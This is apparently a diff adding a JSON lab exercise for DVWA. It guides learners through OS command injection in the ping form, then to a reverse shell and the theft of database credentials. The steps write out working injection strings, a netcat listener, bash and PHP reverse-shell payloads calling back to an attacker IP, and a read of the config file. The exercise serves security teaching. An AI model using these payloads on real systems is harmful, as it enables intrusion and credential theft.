@@ -1,0 +1,72 @@
+{
+  "id": "dvwa-command-injection",
+  "name": "DVWA: Command Injection to Shell",
+  "difficulty": "easy",
+  "container": "dvwa",
+  "ip": "172.20.0.10",
+  "port": 80,
+  "short_description": "Exploit command injection in DVWA to get a reverse shell on the web server.",
+  "description": "DVWA (Damn Vulnerable Web Application) has a command injection vulnerability in the 'ping' functionality. We'll exploit this to execute arbitrary commands and get a reverse shell. This teaches OS command injection - OWASP Top 10 #1.",
+  "steps": [
+    {
+      "title": "Open DVWA in browser",
+      "command": "Open http://localhost:8080 in your browser",
+      "explanation": "Access DVWA. Default login: admin/password. Set security to 'Low' in DVWA Security settings."
+    },
+    {
+      "title": "Navigate to Command Injection",
+      "command": "Click 'Command Injection' in the left menu",
+      "explanation": "This page lets you ping an IP. It's supposed to just ping, but we can inject commands."
+    },
+    {
+      "title": "Test command injection",
+      "command": "127.0.0.1; id",
+      "explanation": "Enter this in the IP field. The semicolon terminates the ping command and runs 'id'.",
+      "expected": "You should see ping output PLUS 'uid=33(www-data)'"
+    },
+    {
+      "title": "Set up a listener in Kali",
+      "command": "nc -lvnp 4444",
+      "explanation": "Start a Netcat listener on port 4444 to catch our reverse shell. Keep this terminal open."
+    },
+    {
+      "title": "Send reverse shell payload",
+      "command": "127.0.0.1; bash -i >& /dev/tcp/172.20.0.5/4444 0>&1",
+      "explanation": "Enter this in the DVWA form. It connects back to your Kali listener.",
+      "expected": "Your Netcat listener receives a shell connection"
+    },
+    {
+      "title": "Alternative: Use PHP reverse shell",
+      "command": "127.0.0.1; php -r '$sock=fsockopen(\"172.20.0.5\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "explanation": "If bash doesn't work, try this PHP payload instead."
+    },
+    {
+      "title": "Verify shell access",
+      "command": "id && hostname",
+      "explanation": "In your Netcat session, confirm you're on the DVWA container.",
+      "expected": "uid=33(www-data) and hostname shows 'dvwa'"
+    },
+    {
+      "title": "Upgrade to interactive shell",
+      "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "explanation": "Get a proper bash shell with job control."
+    },
+    {
+      "title": "Explore the web root",
+      "command": "ls -la /var/www/html/",
+      "explanation": "Browse the web application files. Look for config files with database credentials."
+    },
+    {
+      "title": "Read database config",
+      "command": "cat /var/www/html/config/config.inc.php",
+      "explanation": "Extract database credentials for further access.",
+      "expected": "MySQL username and password"
+    }
+  ],
+  "success_criteria": "You have a shell on the DVWA container as www-data. You can read files and explore the system.",
+  "next_steps": [
+    "Try SQL Injection in DVWA to dump the database",
+    "Attempt privilege escalation to root",
+    "Explore other DVWA vulnerabilities: XSS, CSRF, File Upload"
+  ]
+}
